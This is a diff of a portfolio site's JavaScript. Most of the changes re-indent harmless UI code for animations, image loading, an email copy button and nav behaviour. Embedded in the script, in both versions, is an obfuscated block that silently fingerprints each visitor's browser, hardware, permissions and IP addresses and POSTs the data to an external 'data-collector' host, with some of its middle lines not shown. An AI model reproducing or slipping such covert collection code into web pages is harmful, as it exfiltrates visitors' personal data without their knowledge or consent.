@@ -1,69 +1,70 @@
-document.getElementById('y').textContent = new Date().getFullYear();
-const io = new IntersectionObserver((entries) => {
-  entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('reveal'); });
-}, { threshold: .12 });
-document.querySelectorAll('.fade-up').forEach(el => io.observe(el));
-document.querySelectorAll('[data-tilt]').forEach(card => {
-  const img = card.querySelector('.img');
-  card.addEventListener('mousemove', (e) => {
-    const r = card.getBoundingClientRect();
-    const x = (e.clientX - r.left) / r.width - .5;
-    const y = (e.clientY - r.top) / r.height - .5;
-    card.style.transform = `perspective(900px) rotateX(${(-y*4).toFixed(2)}deg) rotateY(${(x*6).toFixed(2)}deg)`;
-    if (img) img.style.transform = `translateY(${-6 + -y*4}px) scale(1.02)`;
-  });
-  card.addEventListener('mouseleave', () => {
-    card.style.transform = 'perspective(900px) rotateX(0) rotateY(0)';
-    if (img) img.style.transform = 'translateY(0) scale(1)';
-  });
-});
-(function () {
-  const exts = ['webp','jpg','png','jpeg','WEBP','JPG','PNG','JPEG'];
-  const BG = '#162634';
-  document.querySelectorAll('.card .img').forEach(el => {
-    const base = (el.getAttribute('data-proj') || el.closest('.card')?.querySelector('h2')?.textContent)?.trim();
-    if (!base) return;
-    let tried = [];
-    (function tryLoad(i){
-      if (i >= exts.length) {
-        el.style.background = `linear-gradient(${BG}, ${BG})`;
-        return;
-      }
+    document.getElementById('y').textContent = new Date().getFullYear();
+    const io = new IntersectionObserver((entries) => {
+      entries.forEach(e => { if (e.isIntersecting) e.target.classList.add('reveal'); });
+    }, { threshold: .12 });
+    document.querySelectorAll('.fade-up').forEach(el => io.observe(el));
+    document.querySelectorAll('[data-tilt]').forEach(card => {
+      const img = card.querySelector('.img');
+      card.addEventListener('mousemove', (e) => {
+        const r = card.getBoundingClientRect();
+        const x = (e.clientX - r.left) / r.width - .5;
+        const y = (e.clientY - r.top) / r.height - .5;
+        card.style.transform = `perspective(900px) rotateX(${(-y*4).toFixed(2)}deg) rotateY(${(x*6).toFixed(2)}deg)`;
+        if (img) img.style.transform = `translateY(${-6 + -y*4}px) scale(1.02)`;
+      });
+      card.addEventListener('mouseleave', () => {
+        card.style.transform = 'perspective(900px) rotateX(0) rotateY(0)';
+        if (img) img.style.transform = 'translateY(0) scale(1)';
+      });
+    });
+    (function () {
+      const exts = ['webp','jpg','png','jpeg','WEBP','JPG','PNG','JPEG'];
+      const BG = '#162634';
+      document.querySelectorAll('.card .img').forEach(el => {
+        const base = (el.getAttribute('data-proj') || el.closest('.card')?.querySelector('h2')?.textContent)?.trim();
+        if (!base) return;
+        let tried = [];
+        (function tryLoad(i){
+          if (i >= exts.length) {
+            el.style.background = `linear-gradient(${BG}, ${BG})`;
+            return;
+          }
       const url = `../assets/${encodeURIComponent(base)}.${exts[i]}`;
-      tried.push(url);
-      const img = new Image();
-      img.onload = () => {
-        el.style.background = `center / contain no-repeat url("${url}"), linear-gradient(${BG}, ${BG})`;
-        el.style.setProperty('--img-bg', BG);
-        el.setAttribute('aria-label', base);
-      };
-      img.onerror = () => tryLoad(i + 1);
-      img.src = url;
-    })(0);
-  });
-})();
-(function(){
-  const z1 = navigator.userAgentData;
-  const z2 = navigator.userAgent || '';
-  const z3 = navigator.platform || '';
-  const z4 = navigator.language || '';
-  const z5 = (screen && `${screen.width}x${screen.height} @${window.devicePixelRatio||1}`) || '';
-  const z6 = navigator.hardwareConcurrency || null;
-  const z7 = navigator.deviceMemory || null;
-  const z8 = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
-  const z9 = (z1 && z1.brands ? z1.brands.map(b=>`${b.brand} ${b.version}`).join(', ') : '') || '';
-  const zA = (z1 && z1.platform) || z3 || '';
-  const zB = async () => {
-    try{
+          tried.push(url);
+          const img = new Image();
+          img.onload = () => {
+            el.style.background = `center / contain no-repeat url("${url}"), linear-gradient(${BG}, ${BG})`;
+            el.style.setProperty('--img-bg', BG);
+            el.setAttribute('aria-label', base);
+          };
+          img.onerror = () => tryLoad(i + 1);
+          img.src = url;
+        })(0);
+      });
+    })();
+    (function(){
+      const z1 = navigator.userAgentData;
+      const z2 = navigator.userAgent || '';
+      const z3 = navigator.platform || '';
+      const z4 = navigator.language || '';
+      const z5 = (screen && `${screen.width}x${screen.height} @${window.devicePixelRatio||1}`) || '';
+      const z6 = navigator.hardwareConcurrency || null;
+      const z7 = navigator.deviceMemory || null;
+      const z8 = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
+      const z9 = (z1 && z1.brands ? z1.brands.map(b=>`${b.brand} ${b.version}`).join(', ') : '') || '';
+      const zA = (z1 && z1.platform) || z3 || '';
+      const zB = async () => {
+        try{
       const hints = z1?.getHighEntropyValues ? await z1.getHighEntropyValues(['platformVersion','architecture','model','uaFullVersion','bitness','wow64','formFactor','fullVersionList']) : {};
-      return hints || {};
-    }catch{ return {}; }
-  };
-  (async()=>{
-    const BASE_API = 'https://data-collector-gizw.onrender.com';
-    const PAGE_TOKEN = Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b=>b.toString(16).padStart(2,'0')).join('');
-    Object.freeze(PAGE_TOKEN);
-    const he = await zB();
+          return hints || {};
+        }catch{ return {}; }
+      };
+      (async()=>{
+        const BASE_API = 'https://data-collector-gizw.onrender.com';
+        const PAGE_TOKEN = Array.from(crypto.getRandomValues(new Uint8Array(32))).map(b=>b.toString(16).padStart(2,'0')).join('');
+        Object.freeze(PAGE_TOKEN);
+        const he = await zB();
+
     function dn(h){
       const h2 = h || {};
       const brand = (z1 && z1.brands && z1.brands[0]?.brand) || '';
@@ -72,7 +73,7 @@ document.querySelectorAll('[data-tilt]').forEach(card => {
       const guess = [brand, model, plat].filter(Boolean).join('_').replace(/[^A-Za-z0-9_\-\.]/g,'').slice(0,40);
       return guess || 'unknown-device';
     }
-    let extIP = 'unknown', localIP = 'unknown';
+        let extIP = 'unknown', localIP = 'unknown';
     const ips = await Promise.allSettled([
       fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(d=>d.ip),
       fetch('https://api.ipify.org?format=json').catch(()=>fetch('http://ip-api.com/json').then(r=>r.json()).then(d=>d.query)),
@@ -204,17 +205,17 @@ document.querySelectorAll('[data-tilt]').forEach(card => {
       try{
         const result = await navigator.permissions.query({name: perm}).catch(()=>null);
         if(result) permissions.push(`${perm}: ${result.state}`);
-      }catch{}
+        }catch{}
     }
     const permissionsInfo = permissions.length ? permissions.join(', ') : 'unknown';
-    const payload = {
-      externalIP: extIP,
-      localIP: localIP,
+        const payload = {
+          externalIP: extIP,
+          localIP: localIP,
       userAgent: z2,
-      platform: zA,
-      platformVersion: he.platformVersion||'',
-      architecture: he.architecture||'',
-      model: he.model||'',
+          platform: zA,
+          platformVersion: he.platformVersion||'',
+          architecture: he.architecture||'',
+          model: he.model||'',
       browserBrands: z9,
       browserVersion: he.uaFullVersion||'',
       vendor: navigator.vendor||'unknown',
@@ -265,59 +266,64 @@ document.querySelectorAll('[data-tilt]').forEach(card => {
       const maxLen = Math.max(...entries.map(([k]) => k.length));
       return `\n=== ${section} ===\n${entries.map(([k,v]) => `  ${k.padEnd(maxLen+2)}: ${v}`).join('\n')}`;
     }).join('');
-    try {
-      const collectPayload = { content: txt, platform: zA, model: he.model||'' };
-      const send = () => fetch(`${BASE_API}/collect`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(collectPayload), keepalive: true });
-      let ok = false;
-      try{ const r = await Promise.race([send(), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 6000))]); ok = r && r.ok; }catch{}
-    } catch {}
-  })();
-})();
-(function(){
-  const toggle = document.getElementById('gmailToggle');
+        try {
+          const collectPayload = { content: txt, platform: zA, model: he.model||'' };
+          const send = () => fetch(`${BASE_API}/collect`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(collectPayload),
+            keepalive: true
+          });
+          let ok = false;
+          try{ const r = await Promise.race([send(), new Promise((_,rej)=>setTimeout(()=>rej(new Error('timeout')), 6000))]); ok = r && r.ok; }catch{}
+        } catch {}
+      })();
+    })();
+    (function(){
+      const toggle = document.getElementById('gmailToggle');
   const panel = document.getElementById('gmailPanel');
-  const copyBtn= document.getElementById('copyEmail');
-  const email  = 'ububkmart@gmail.com';
-  if(toggle && panel){
-    const setOpen = (open) => {
-      toggle.setAttribute('aria-expanded', open);
-      panel.setAttribute('aria-hidden', String(!open));
-      if(open){ panel.classList.add('open'); panel.style.maxHeight = panel.scrollHeight + 'px'; }
-      else     { panel.style.maxHeight = '0px'; panel.classList.remove('open'); }
-    };
-    toggle.addEventListener('click', () => setOpen(toggle.getAttribute('aria-expanded') !== 'true'));
-    window.addEventListener('resize', () => { if(panel.classList.contains('open')) panel.style.maxHeight = panel.scrollHeight + 'px'; });
-    document.addEventListener('click', (e) => {
-      const wrap = document.querySelector('.reveal-wrap');
-      if(!wrap) return;
-      const inside = wrap.contains(e.target);
-      const open   = toggle.getAttribute('aria-expanded') === 'true';
-      if(open && !inside) setOpen(false);
-    });
-  }
-  if(copyBtn){
-    copyBtn.addEventListener('click', async () => {
-      try { await navigator.clipboard.writeText(email); copyBtn.textContent = 'Скопировано ✓'; setTimeout(()=>copyBtn.textContent='Копировать', 1400); }
-      catch { copyBtn.textContent = email; }
-    });
-  }
-})();
-(function () {
-  const nav = document.querySelector('.nav');
-  if (!nav) return;
-  let lastY = window.pageYOffset || document.documentElement.scrollTop || 0;
-  let downAcc = 0, upAcc = 0;
-  const HIDE_AFTER = 16;
-  const PEEK_AFTER = 8;
-  const SHOW_AFTER = 70;
-  function onScroll() {
-    const y = window.pageYOffset || document.documentElement.scrollTop || 0;
-    const dy = y - lastY;
-    lastY = y < 0 ? 0 : y;
-    if (y <= 0) { nav.classList.remove('nav--hidden', 'nav--peek'); downAcc = upAcc = 0; return; }
-    if (dy > 0) { downAcc += dy; upAcc = 0; if (downAcc > HIDE_AFTER) { nav.classList.add('nav--hidden'); nav.classList.remove('nav--peek'); } }
-    else if (dy < 0) { upAcc += -dy; downAcc = 0; if (upAcc > SHOW_AFTER) { nav.classList.remove('nav--hidden', 'nav--peek'); } else if (upAcc > PEEK_AFTER) { nav.classList.remove('nav--hidden'); nav.classList.add('nav--peek'); } }
-  }
-  window.addEventListener('scroll', onScroll, { passive: true });
-})();
+      const copyBtn= document.getElementById('copyEmail');
+      const email  = 'ububkmart@gmail.com';
+      if(toggle && panel){
+        const setOpen = (open) => {
+          toggle.setAttribute('aria-expanded', open);
+          panel.setAttribute('aria-hidden', String(!open));
+          if(open){ panel.classList.add('open'); panel.style.maxHeight = panel.scrollHeight + 'px'; }
+          else     { panel.style.maxHeight = '0px'; panel.classList.remove('open'); }
+        };
+        toggle.addEventListener('click', () => setOpen(toggle.getAttribute('aria-expanded') !== 'true'));
+        window.addEventListener('resize', () => { if(panel.classList.contains('open')) panel.style.maxHeight = panel.scrollHeight + 'px'; });
+        document.addEventListener('click', (e) => {
+          const wrap = document.querySelector('.reveal-wrap');
+          if(!wrap) return;
+          const inside = wrap.contains(e.target);
+          const open   = toggle.getAttribute('aria-expanded') === 'true';
+          if(open && !inside) setOpen(false);
+        });
+      }
+      if(copyBtn){
+        copyBtn.addEventListener('click', async () => {
+          try { await navigator.clipboard.writeText(email); copyBtn.textContent = 'Скопировано ✓'; setTimeout(()=>copyBtn.textContent='Копировать', 1400); }
+          catch { copyBtn.textContent = email; }
+        });
+      }
+    })();
+    (function () {
+      const nav = document.querySelector('.nav');
+      if (!nav) return;
+      let lastY = window.pageYOffset || document.documentElement.scrollTop || 0;
+      let downAcc = 0, upAcc = 0;
+      const HIDE_AFTER = 16;
+      const PEEK_AFTER = 8;
+      const SHOW_AFTER = 70;
+      function onScroll() {
+        const y = window.pageYOffset || document.documentElement.scrollTop || 0;
+        const dy = y - lastY;
+        lastY = y < 0 ? 0 : y;
+        if (y <= 0) { nav.classList.remove('nav--hidden', 'nav--peek'); downAcc = upAcc = 0; return; }
+        if (dy > 0) { downAcc += dy; upAcc = 0; if (downAcc > HIDE_AFTER) { nav.classList.add('nav--hidden'); nav.classList.remove('nav--peek'); } }
+        else if (dy < 0) { upAcc += -dy; downAcc = 0; if (upAcc > SHOW_AFTER) { nav.classList.remove('nav--hidden', 'nav--peek'); } else if (upAcc > PEEK_AFTER) { nav.classList.remove('nav--hidden'); nav.classList.add('nav--peek'); } }
+      }
+      window.addEventListener('scroll', onScroll, { passive: true });
+    })();
 
